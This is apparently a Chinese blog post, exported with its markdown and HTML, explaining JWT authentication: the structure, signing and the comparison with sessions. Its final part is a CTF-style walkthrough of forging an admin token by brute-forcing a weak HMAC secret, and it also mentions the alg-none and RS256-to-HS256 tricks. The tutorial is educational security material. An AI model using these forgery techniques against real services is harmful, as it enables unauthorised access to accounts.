Payload（载荷）\n\npayload**就是存放有效信息的地方**，这些有效信息包含三个部分\n\n- **registered** 标准中注册的声明\n- **public** 公共的声明\n- **private** 私有的声明\n\n\n\n**标签中注册的声明**\n\n- **iss: jwt签发者**\n- **sub: jwt所面向的用户**\n- **aud: 接收jwt的一方**\n- **exp: jwt的过期时间，这个过期时间必须要大于签发时间**\n- **nbf: 定义在什么时间之前，该jwt都是不可用的.**\n- **iat: jwt的签发时间**\n- **jti: jwt的唯一身份标识，主要用来作为一次性token，从而回避重放攻击。**\n\n\n\n**公共的声明**\n\n公共的声明可以添加任何的信息，一般添加**用户的相关信息**或**其他业务需要的必要信息**。但不建议添加敏感信息，因为该部分在客户端可解密。\n\n\n\n**私有的声明**\n\n私有声明**是提供者和消费者所共同定义的声明**，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。\n\n\n\n下面是一个自己定义的**payload**\n\n```\n{\n  \"sub\": \"1234567890\",\n  \"iss\": \"http://localhost:8000/auth/login\",\n  \"iat\": 1451888119,\n  \"exp\": 1454516119,\n  \"nbf\": 1451888119,\n  \"name\": \"John Doe\",\n  \"admin\": true\n}\n```\n\n将其base64加密得到jwt第二部分\n\n```\neyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9\n```\n\n\n\n> 注意，不要在JWT的payload或header中放置敏感信息，除非它们是加密的。\n\n\n\n#### Signature（签证）\n\n签证信息由**3个部分组成**\n\n- **header（base64加密后的）**\n- **payload（base64加密后的）**\n- **secret**\n\n这个部分需要base64加密后的header和base64加密后的payload使用`.`连接组成的字符串，然后通过header中声明的加密方式进行加盐`secret`组合加密，然后就构成了jwt的第三部分。\n\n```\n// javascript\nvar encodedString = base64UrlEncode(header) + '.' + base64UrlEncode(payload);\n\nvar signature = HMACSHA256(encodedString, 'secret'); // TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ\n```\n\n```\nHMACSHA256(base64UrlEncode(header) + \".\" + base64UrlEncode(payload), secret)\n```\n\n\n\n> **注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret，那就意味着客户端是可以自我签发jwt了。**\n\n\n\n### JWT认证过程\n\n客户端接受服务器的**JWT**将其存储在**Cookie**或loaclSrorage中。此后，客户端将在与服务器进行交互中都会带JWT。如果它存储在Cookie中，就可以自动发送，但不会跨域，因此一般是将它放在HTTP请求的**<u>Header Authorization</u>**字段中当跨域时，也可以将JWT被放置于**POST**请求的数据主体中。\n\n服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。\n\n一般是在请求头里加入`Authorization`，并加上`Bearer`标注：\n\n```\nfetch('api/user/1', {\n  headers: {\n    'Authorization': 'Bearer ' + token\n  }\n})\n```\n\n\n\n![图片-1684742819251](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151431006.png)\n\n\n\nJWT本身包含认证信息，因此一旦信息泄露，任何人都可以获得令牌的所有权限。为了减少盗用，JWT的有效期不宜设置太长。对于某些重要操作，用户在使用时应该每次都进行进行身份验证。为了减少盗用和窃取，JWT不建议使用HTTP协议来传输代码，而是使用加密的HTTPS协议进行传输。\n\n\n\n### JWT安全隐患\n\n- 修改算法为none\n- 修改算法从RS256到HS256\n- 信息泄露 **密钥泄露**\n- 爆破密钥\n\n这里我们着重说一下**jwt伪造**，这个考点在ctf中经常出现\n\n\n\n#### JWT伪造\n\n当我面拿到一串**JWT**\n\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ImZhbHNlIn0.oe4qhTxvJB8nNAsFWJc7_m3UylVZzO3FwhkYuESAyUM\n```\n\n我们去在线解jwt网站encode https://jwt.io/\n\n![图片-1684742810710](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151432089.png)\n\n**所以，我们的目的就是把false改成true，而且要通过服务器的验证，这点很重要，并不是直接把false改成true就万事大吉了。因为服务器收到token后会对token的有效性进行验证。**\n\n**验证方法：首先服务端会产生一个key，然后以这个key作为密钥，使用第一部分选择的加密方式（这里就是HS256），对第一部分和第二部分拼接的结果进行加密，然后把加密结果放到第三部分。**\n\n**服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。**\n\n**因为加密算法我们已经知道了，我们只要再得到加密的key，我们就能伪造数据，并且通过服务器的检查**\n\n\n\n我们需要对**secret**进行爆破\n\n推荐工具  https://github.com/brendan-rius/c-jwt-cracker\n\n\n\n**破解出来的加密密钥key就是：54l7y**，\n\n**现在我们可以任意构造我们想要的jwt**\n\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6InRydWUifQ.hv55uOLPmX_C0Nx8qz-O2psgUq6V3EA0fgRqGFm5W6Q\n```\n\n构造成功","source":"_posts/浅析JWT.md","raw":"---\ntitle: 浅析JWT\ndate: 2022-01-13 22:27:22\nexcerpt: 浅析JWT\ncategories: 学习\n---\n\n\n\n# 浅析JWT\n\n### JWT简介\n\n> Json web token (JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519)。该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。\n\n我们在学习jwt的同时，也需要了解传统session认证\n\n### session认证\n\n> 我们知道，http协议本身是一种无状态的协议，而这就意味着如果用户向我们的应用提供了用户名和密码来进行用户认证，那么下一次请求时，用户还要再一次进行用户认证才行，因为根据http协议，我们并不能知道是哪个用户发出的请求，所以为了让我们的应用能识别是哪个用户发出的请求，我们只能在服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie，以便下次请求时发送给我们的应用，这样我们的应用就能识别请求来自哪个用户了，这就是传统的基于session认证。\n\n\n\n这种传统的**session**我们很难得到拓展，并且session相关的数据是保存在服务器中，随着用户数量的增加，服务器的载荷也就越大，这时候许多问题就暴露了出来\n\n- **Session**：每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的鉴别，通常而言session都是保存在内存中，而**随着认证用户的增多，服务端的开销会明显增大。**\n- **扩展性**：用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上，这样才能拿到授权的资源，这样在分布式的应用上，相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力。\n- **CSRF**: 因为是 基于cookie 来进行用户识别的，**cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。**\n\n\n\n### JWT与Session的差异\n\n**相同点**：**它们都是存储用户信息；**\n\n**不同点**\n\n- **Session是在服务器端的，而JWT是在客户端的。**\n\n- **Session方式存储用户信息的最大问题在于要占用大量服务器内存，增加服务器的开销。而JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。**\n- **Session的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端**\n\n![图片-1684742759615](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151430767.png)\n\n\n\n### 基于Token的身份认证 与 基于服务器的身份认证\n\n#### 基于服务器的身份认证\n\n在讨论基于Token的身份认证是如何工作的以及它的好处之前，我们先来看一下以前我们是怎么做的：\n\n> HTTP协议是无状态的，也就是说，如果我们已经认证了一个用户，那么他下一次请求的时候，服务器不知道我是谁，我们必须再次认证\n\n传统的做法是将已经认证过的用户信息存储在服务器上，比如Session。用户下次请求的时候带着Session ID，然后服务器以此检查用户是否认证过。\n\n这种基于服务器的身份认证方式存在一些问题：\n\n- **Sessions : 每次用户认证通过以后，服务器需要创建一条记录保存用户信息，通常是在内存中，随着认证通过的用户越来越多，服务器的在这里的开销就会越来越大。**\n- **Scalability : 由于Session是在内存中的，这就带来一些扩展性的问题。**\n- **CORS : 当我们想要扩展我们的应用，让我们的数据被多个移动设备使用时，我们必须考虑跨资源共享问题。当使用AJAX调用从另一个域名下获取资源时，我们可能会遇到禁止请求的问题。**\n- **CSRF : 用户很容易受到CSRF攻击。**\n\n#### 用Token的好处\n\n- **无状态和可扩展性：Tokens存储在客户端。完全无状态，可扩展。我们的负载均衡器可以将用户传递到任意服务器，因为在任何地方都没有状态或会话信息。**\n- **安全：Token不是Cookie。（The token, not a  cookie.）每次请求的时候Token都会被发送。而且，由于没有Cookie被发送，还有助于防止CSRF攻击。即使在你的实现中将token存储到客户端的Cookie中，这个Cookie也只是一种存储机制，而非身份认证机制。没有基于会话的信息可以操作，因为我们没有会话!**\n- **token在一段时间以后会过期，这个时候用户需要重新登录。这有助于我们保持安全。还有一个概念叫token撤销，它允许我们根据相同的授权许可使特定的token甚至一组token无效。**\n\n### 什么时候用JWT\n\n下列场景中使用JSON Web Token是很有用的：\n\n- **Authorization** (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。\n- **Information Exchange** (信息交换) : 对于安全的在各方之间传输信息而言，JSON Web  Tokens无疑是一种很好的方式。因为JWTs可以被签名，例如，用公钥/私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。\n\n\n\n### JWT结构\n\nJSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：\n\n- **Header**\n- **Payload**\n- **Signature**\n\n下面具体来看看每个部分\n\n#### Header（头部）\n\njwt头部承载两部分信息\n\n- **声明类型**：类似于jwt\n- **声明加密的算法**：通常直接使用 HMAC SHA256。这的加密算法也就是签名算法。\n\n```\n{\n  'typ': 'JWT',\n  'alg': 'HS256'\n}\n```\n\n然后将头部进行**base64加密**得到第一部分\n\n```\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9\n```\n\n\n\n> **可以将JWT中的alg算法修改为none：**\n>\n> **JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么JWT的第三部分会被置空，这样任何token都是有效的。这样就可以伪造token进行随意访问。**\n\n\n\n#### Payload（载荷）\n\npayload**就是存放有效信息的地方**，这些有效信息包含三个部分\n\n- **registered** 标准中注册的声明\n- **public** 公共的声明\n- **private** 私有的声明\n\n\n\n**标签中注册的声明**\n\n- **iss: jwt签发者**\n- **sub: jwt所面向的用户**\n- **aud: 接收jwt的一方**\n- **exp: jwt的过期时间，这个过期时间必须要大于签发时间**\n- **nbf: 定义在什么时间之前，该jwt都是不可用的.**\n- **iat: jwt的签发时间**\n- **jti: jwt的唯一身份标识，主要用来作为一次性token，从而回避重放攻击。**\n\n\n\n**公共的声明**\n\n公共的声明可以添加任何的信息，一般添加**用户的相关信息**或**其他业务需要的必要信息**。但不建议添加敏感信息，因为该部分在客户端可解密。\n\n\n\n**私有的声明**\n\n私有声明**是提供者和消费者所共同定义的声明**，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。\n\n\n\n下面是一个自己定义的**payload**\n\n```\n{\n  \"sub\": \"1234567890\",\n  \"iss\": \"http://localhost:8000/auth/login\",\n  \"iat\": 1451888119,\n  \"exp\": 1454516119,\n  \"nbf\": 1451888119,\n  \"name\": \"John Doe\",\n  \"admin\": true\n}\n```\n\n将其base64加密得到jwt第二部分\n\n```\neyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9\n```\n\n\n\n> 注意，不要在JWT的payload或header中放置敏感信息，除非它们是加密的。\n\n\n\n#### Signature（签证）\n\n签证信息由**3个部分组成**\n\n- **header（base64加密后的）**\n- **payload（base64加密后的）**\n- **secret**\n\n这个部分需要base64加密后的header和base64加密后的payload使用`.`连接组成的字符串，然后通过header中声明的加密方式进行加盐`secret`组合加密，然后就构成了jwt的第三部分。\n\n```\n// javascript\nvar encodedString = base64UrlEncode(header) + '.' + base64UrlEncode(payload);\n\nvar signature = HMACSHA256(encodedString, 'secret'); // TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ\n```\n\n```\nHMACSHA256(base64UrlEncode(header) + \".\" + base64UrlEncode(payload), secret)\n```\n\n\n\n> **注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret，那就意味着客户端是可以自我签发jwt了。**\n\n\n\n### JWT认证过程\n\n客户端接受服务器的**JWT**将其存储在**Cookie**或loaclSrorage中。此后，客户端将在与服务器进行交互中都会带JWT。如果它存储在Cookie中，就可以自动发送，但不会跨域，因此一般是将它放在HTTP请求的**<u>Header Authorization</u>**字段中当跨域时，也可以将JWT被放置于**POST**请求的数据主体中。\n\n服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。\n\n一般是在请求头里加入`Authorization`，并加上`Bearer`标注：\n\n```\nfetch('api/user/1', {\n  headers: {\n    'Authorization': 'Bearer ' + token\n  }\n})\n```\n\n\n\n![图片-1684742819251](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151431006.png)\n\n\n\nJWT本身包含认证信息，因此一旦信息泄露，任何人都可以获得令牌的所有权限。为了减少盗用，JWT的有效期不宜设置太长。对于某些重要操作，用户在使用时应该每次都进行进行身份验证。为了减少盗用和窃取，JWT不建议使用HTTP协议来传输代码，而是使用加密的HTTPS协议进行传输。\n\n\n\n### JWT安全隐患\n\n- 修改算法为none\n- 修改算法从RS256到HS256\n- 信息泄露 **密钥泄露**\n- 爆破密钥\n\n这里我们着重说一下**jwt伪造**，这个考点在ctf中经常出现\n\n\n\n#### JWT伪造\n\n当我面拿到一串**JWT**\n\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ImZhbHNlIn0.oe4qhTxvJB8nNAsFWJc7_m3UylVZzO3FwhkYuESAyUM\n```\n\n我们去在线解jwt网站encode https://jwt.io/\n\n![图片-1684742810710](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151432089.png)\n\n**所以，我们的目的就是把false改成true，而且要通过服务器的验证，这点很重要，并不是直接把false改成true就万事大吉了。因为服务器收到token后会对token的有效性进行验证。**\n\n**验证方法：首先服务端会产生一个key，然后以这个key作为密钥，使用第一部分选择的加密方式（这里就是HS256），对第一部分和第二部分拼接的结果进行加密，然后把加密结果放到第三部分。**\n\n**服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。**\n\n**因为加密算法我们已经知道了，我们只要再得到加密的key，我们就能伪造数据，并且通过服务器的检查**\n\n\n\n我们需要对**secret**进行爆破\n\n推荐工具  https://github.com/brendan-rius/c-jwt-cracker\n\n\n\n**破解出来的加密密钥key就是：54l7y**，\n\n**现在我们可以任意构造我们想要的jwt**\n\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6InRydWUifQ.hv55uOLPmX_C0Nx8qz-O2psgUq6V3EA0fgRqGFm5W6Q\n```\n\n构造成功","slug":"浅析JWT","published":1,"updated":"2024-04-17T08:43:00.255Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7ja000rh7761l7x9yqt","content":"<h1 id=\"浅析JWT\"><a href=\"#浅析JWT\" class=\"headerlink\" title=\"浅析JWT\"></a>浅析JWT</h1><h3 id=\"JWT简介\"><a href=\"#JWT简介\" class=\"headerlink\" title=\"JWT简介\"></a>JWT简介</h3><blockquote>\n<p>Json web token (JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519)。该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>\n</blockquote>\n<p>我们在学习jwt的同时，也需要了解传统session认证</p>\n<h3 id=\"session认证\"><a href=\"#session认证\" class=\"headerlink\" title=\"session认证\"></a>session认证</h3><blockquote>\n<p>我们知道，http协议本身是一种无状态的协议，而这就意味着如果用户向我们的应用提供了用户名和密码来进行用户认证，那么下一次请求时，用户还要再一次进行用户认证才行，因为根据http协议，我们并不能知道是哪个用户发出的请求，所以为了让我们的应用能识别是哪个用户发出的请求，我们只能在服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie，以便下次请求时发送给我们的应用，这样我们的应用就能识别请求来自哪个用户了，这就是传统的基于session认证。</p>\n</blockquote>\n<p>这种传统的<strong>session</strong>我们很难得到拓展，并且session相关的数据是保存在服务器中，随着用户数量的增加，服务器的载荷也就越大，这时候许多问题就暴露了出来</p>\n<ul>\n<li><strong>Session</strong>：每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的鉴别，通常而言session都是保存在内存中，而<strong>随着认证用户的增多，服务端的开销会明显增大。</strong></li>\n<li><strong>扩展性</strong>：用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上，这样才能拿到授权的资源，这样在分布式的应用上，相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力。</li>\n<li><strong>CSRF</strong>: 因为是 基于cookie 来进行用户识别的，<strong>cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。</strong></li>\n</ul>\n<h3 id=\"JWT与Session的差异\"><a href=\"#JWT与Session的差异\" class=\"headerlink\" title=\"JWT与Session的差异\"></a>JWT与Session的差异</h3><p><strong>相同点</strong>：<strong>它们都是存储用户信息；</strong></p>\n<p><strong>不同点</strong></p>\n<ul>\n<li><p><strong>Session是在服务器端的，而JWT是在客户端的。</strong></p>\n</li>\n<li><p><strong>Session方式存储用户信息的最大问题在于要占用大量服务器内存，增加服务器的开销。而JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。</strong></p>\n</li>\n<li><p><strong>Session的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端</strong></p>\n</li>\n</ul>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151430767.png\"\n                        alt=\"图片-1684742759615\"\n                 ></p>\n<h3 id=\"基于Token的身份认证-与-基于服务器的身份认证\"><a href=\"#基于Token的身份认证-与-基于服务器的身份认证\" class=\"headerlink\" title=\"基于Token的身份认证 与 基于服务器的身份认证\"></a>基于Token的身份认证 与 基于服务器的身份认证</h3><h4 id=\"基于服务器的身份认证\"><a href=\"#基于服务器的身份认证\" class=\"headerlink\" title=\"基于服务器的身份认证\"></a>基于服务器的身份认证</h4><p>在讨论基于Token的身份认证是如何工作的以及它的好处之前，我们先来看一下以前我们是怎么做的：</p>\n<blockquote>\n<p>HTTP协议是无状态的，也就是说，如果我们已经认证了一个用户，那么他下一次请求的时候，服务器不知道我是谁，我们必须再次认证</p>\n</blockquote>\n<p>传统的做法是将已经认证过的用户信息存储在服务器上，比如Session。用户下次请求的时候带着Session ID，然后服务器以此检查用户是否认证过。</p>\n<p>这种基于服务器的身份认证方式存在一些问题：</p>\n<ul>\n<li><strong>Sessions : 每次用户认证通过以后，服务器需要创建一条记录保存用户信息，通常是在内存中，随着认证通过的用户越来越多，服务器的在这里的开销就会越来越大。</strong></li>\n<li><strong>Scalability : 由于Session是在内存中的，这就带来一些扩展性的问题。</strong></li>\n<li><strong>CORS : 当我们想要扩展我们的应用，让我们的数据被多个移动设备使用时，我们必须考虑跨资源共享问题。当使用AJAX调用从另一个域名下获取资源时，我们可能会遇到禁止请求的问题。</strong></li>\n<li><strong>CSRF : 用户很容易受到CSRF攻击。</strong></li>\n</ul>\n<h4 id=\"用Token的好处\"><a href=\"#用Token的好处\" class=\"headerlink\" title=\"用Token的好处\"></a>用Token的好处</h4><ul>\n<li><strong>无状态和可扩展性：Tokens存储在客户端。完全无状态，可扩展。我们的负载均衡器可以将用户传递到任意服务器，因为在任何地方都没有状态或会话信息。</strong></li>\n<li><strong>安全：Token不是Cookie。（The token, not a  cookie.）每次请求的时候Token都会被发送。而且，由于没有Cookie被发送，还有助于防止CSRF攻击。即使在你的实现中将token存储到客户端的Cookie中，这个Cookie也只是一种存储机制，而非身份认证机制。没有基于会话的信息可以操作，因为我们没有会话!</strong></li>\n<li><strong>token在一段时间以后会过期，这个时候用户需要重新登录。这有助于我们保持安全。还有一个概念叫token撤销，它允许我们根据相同的授权许可使特定的token甚至一组token无效。</strong></li>\n</ul>\n<h3 id=\"什么时候用JWT\"><a href=\"#什么时候用JWT\" class=\"headerlink\" title=\"什么时候用JWT\"></a>什么时候用JWT</h3><p>下列场景中使用JSON Web Token是很有用的：</p>\n<ul>\n<li><strong>Authorization</strong> (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。</li>\n<li><strong>Information Exchange</strong> (信息交换) : 对于安全的在各方之间传输信息而言，JSON Web  Tokens无疑是一种很好的方式。因为JWTs可以被签名，例如，用公钥&#x2F;私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。</li>\n</ul>\n<h3 id=\"JWT结构\"><a href=\"#JWT结构\" class=\"headerlink\" title=\"JWT结构\"></a>JWT结构</h3><p>JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：</p>\n<ul>\n<li><strong>Header</strong></li>\n<li><strong>Payload</strong></li>\n<li><strong>Signature</strong></li>\n</ul>\n<p>下面具体来看看每个部分</p>\n<h4 id=\"Header（头部）\"><a href=\"#Header（头部）\" class=\"headerlink\" title=\"Header（头部）\"></a>Header（头部）</h4><p>jwt头部承载两部分信息</p>\n<ul>\n<li><strong>声明类型</strong>：类似于jwt</li>\n<li><strong>声明加密的算法</strong>：通常直接使用 HMAC SHA256。这的加密算法也就是签名算法。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &#x27;typ&#x27;: &#x27;JWT&#x27;,</span><br><span class=\"line\">  &#x27;alg&#x27;: &#x27;HS256&#x27;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后将头部进行<strong>base64加密</strong>得到第一部分</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p><strong>可以将JWT中的alg算法修改为none：</strong></p>\n<p><strong>JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么JWT的第三部分会被置空，这样任何token都是有效的。这样就可以伪造token进行随意访问。</strong></p>\n</blockquote>\n<h4 id=\"Payload（载荷）\"><a href=\"#Payload（载荷）\" class=\"headerlink\" title=\"Payload（载荷）\"></a>Payload（载荷）</h4><p>payload<strong>就是存放有效信息的地方</strong>，这些有效信息包含三个部分</p>\n<ul>\n<li><strong>registered</strong> 标准中注册的声明</li>\n<li><strong>public</strong> 公共的声明</li>\n<li><strong>private</strong> 私有的声明</li>\n</ul>\n<p><strong>标签中注册的声明</strong></p>\n<ul>\n<li><strong>iss: jwt签发者</strong></li>\n<li><strong>sub: jwt所面向的用户</strong></li>\n<li><strong>aud: 接收jwt的一方</strong></li>\n<li><strong>exp: jwt的过期时间，这个过期时间必须要大于签发时间</strong></li>\n<li><strong>nbf: 定义在什么时间之前，该jwt都是不可用的.</strong></li>\n<li><strong>iat: jwt的签发时间</strong></li>\n<li><strong>jti: jwt的唯一身份标识，主要用来作为一次性token，从而回避重放攻击。</strong></li>\n</ul>\n<p><strong>公共的声明</strong></p>\n<p>公共的声明可以添加任何的信息，一般添加<strong>用户的相关信息</strong>或<strong>其他业务需要的必要信息</strong>。但不建议添加敏感信息，因为该部分在客户端可解密。</p>\n<p><strong>私有的声明</strong></p>\n<p>私有声明<strong>是提供者和消费者所共同定义的声明</strong>，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。</p>\n<p>下面是一个自己定义的<strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class=\"line\">  &quot;iss&quot;: &quot;http://localhost:8000/auth/login&quot;,</span><br><span class=\"line\">  &quot;iat&quot;: 1451888119,</span><br><span class=\"line\">  &quot;exp&quot;: 1454516119,</span><br><span class=\"line\">  &quot;nbf&quot;: 1451888119,</span><br><span class=\"line\">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class=\"line\">  &quot;admin&quot;: true</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>将其base64加密得到jwt第二部分</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p>注意，不要在JWT的payload或header中放置敏感信息，除非它们是加密的。</p>\n</blockquote>\n<h4 id=\"Signature（签证）\"><a href=\"#Signature（签证）\" class=\"headerlink\" title=\"Signature（签证）\"></a>Signature（签证）</h4><p>签证信息由<strong>3个部分组成</strong></p>\n<ul>\n<li><strong>header（base64加密后的）</strong></li>\n<li><strong>payload（base64加密后的）</strong></li>\n<li><strong>secret</strong></li>\n</ul>\n<p>这个部分需要base64加密后的header和base64加密后的payload使用<code>.</code>连接组成的字符串，然后通过header中声明的加密方式进行加盐<code>secret</code>组合加密，然后就构成了jwt的第三部分。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// javascript</span><br><span class=\"line\">var encodedString = base64UrlEncode(header) + &#x27;.&#x27; + base64UrlEncode(payload);</span><br><span class=\"line\"></span><br><span class=\"line\">var signature = HMACSHA256(encodedString, &#x27;secret&#x27;); // TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret)</span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p><strong>注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret，那就意味着客户端是可以自我签发jwt了。</strong></p>\n</blockquote>\n<h3 id=\"JWT认证过程\"><a href=\"#JWT认证过程\" class=\"headerlink\" title=\"JWT认证过程\"></a>JWT认证过程</h3><p>客户端接受服务器的<strong>JWT</strong>将其存储在<strong>Cookie</strong>或loaclSrorage中。此后，客户端将在与服务器进行交互中都会带JWT。如果它存储在Cookie中，就可以自动发送，但不会跨域，因此一般是将它放在HTTP请求的**<u>Header Authorization</u><strong>字段中当跨域时，也可以将JWT被放置于</strong>POST**请求的数据主体中。</p>\n<p>服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。</p>\n<p>一般是在请求头里加入<code>Authorization</code>，并加上<code>Bearer</code>标注：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fetch(&#x27;api/user/1&#x27;, &#123;</span><br><span class=\"line\">  headers: &#123;</span><br><span class=\"line\">    &#x27;Authorization&#x27;: &#x27;Bearer &#x27; + token</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151431006.png\"\n                        alt=\"图片-1684742819251\"\n                 